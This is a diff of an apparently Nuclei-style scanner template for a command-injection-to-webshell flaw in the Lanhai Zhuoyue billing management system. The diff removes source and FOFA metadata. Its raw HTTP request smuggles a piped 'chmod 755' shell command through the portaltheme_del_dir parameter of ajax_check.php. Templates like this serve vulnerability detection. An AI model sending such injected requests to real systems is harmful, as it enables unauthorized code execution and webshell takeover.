@@ -3,14 +3,8 @@ info:
   name: 蓝海卓越计费管理系统多漏洞导致getshell
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4a1169157ea77c9995eb5a905afb3740
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4a1169157ea77c9995eb5a905afb3740
-    fofa: + fofa`title=="蓝海卓越计费管理系统"`
 http:
 - raw:
   - 'GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2F|chmod+755+/usr/local/usr-gui/test.php HTTP/1.1
